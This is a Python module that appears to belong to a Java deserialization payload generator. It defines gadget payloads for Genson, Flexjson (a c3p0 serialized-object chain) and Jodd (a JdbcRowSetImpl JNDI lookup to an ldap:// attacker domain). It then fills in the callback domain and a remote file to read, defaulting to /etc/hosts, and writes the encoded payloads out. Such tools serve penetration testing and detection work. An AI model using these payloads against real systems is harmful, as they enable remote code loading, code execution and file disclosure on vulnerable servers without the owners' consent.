import os
import logging
from .serializer import Serializer

class Sploits(Serializer):

    gadgets = [
        {
            'id': 'genson',
            'name': 'genson',
            'description': 'Genson error-based detection',
            'output': 'json',
            'payload': '{"@class":""}',
            'unsafe': False,
            'ref': 'https://github.com/nccgroup/freddy/blob/master/src/nb/freddy/modules/java/GensonModule.java'
        },
        {
            'id': 'flexjson',
            'name': 'flexjson',
            'description': 'Flexjson error-based detection',
            'output': 'json',
            'payload': '{"class":"com.mchange.v2.c3p0.WrapperConnectionPoolDataSource","userOverridesAsString":"HexAsciiSerializedMap:aced0005_serialized_obj;"}',
            'unsafe': False,
            'ref': 'https://github.com/GrrrDog/Sploits/blob/master/flexjson.json'
        },
        {
            'id': 'jodd',
            'name': 'jodd',
            'description': 'Jodd datasource deserialization',
            'output': 'json',
            'payload': '{"class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<domain>/<className>","autoCommit":true}',
            'unsafe': False,
            'ref': 'https://github.com/GrrrDog/Sploits/blob/master/jodd.json'
        }
    ]

    def __init__(self, chainOpts):
        super().__init__('', chainOpts)
        
    def exists(self):
        return True
    
    def payload(self, chainName, chainArgs):
        return self.gadgets[chainName]
    
    def chains(self):
        return self.gadgets

    def generate(self, chains):

        if len(chains) == 0:
            return 0

        interact_domain = self.chainOpts.interact_domain
        remote_file_to_read = "/etc/hosts" if self.chainOpts.remote_file_to_read is None else self.chainOpts.remote_file_to_read
    
        logging.info(f"Interact domain: {interact_domain}")
        logging.info(f"Remote file to read: {remote_file_to_read}")

        logging.info(f"Generating payloads...")
        count = 0
        for chain in chains:

            if self.chainOpts.format != None and self.chainOpts.format != chain['output']:
                logging.debug(f"[{chain['name']}] Skipping chain of format '{chain['output']}'")
                continue

            if chain['unsafe'] and not self.chainOpts.unsafe:
                logging.debug(f"[{chain['name']}] Skipping unsafe chain")
                continue
            
            logging.info(f"[{chain['name']}] Generating payload '{chain['description']}'")

            chainUniqueId = chain['id']

            payload = chain['payload']
            payload = payload.replace('<domain>', f"{chain['id']}.{interact_domain}")
            payload = payload.replace('<remote_file_to_read>', f"{remote_file_to_read}")
            payload = payload.replace('<className>', f"{chain['id']}")
            payload = payload.encode('utf-8')
            
            logging.debug(f"[{chain['name']}] Payload generated with {len(payload)} bytes")

            payload = self.encode(payload)

            self.output(chainUniqueId, payload+b"\n")

            count = count + 1    
            
            
        return count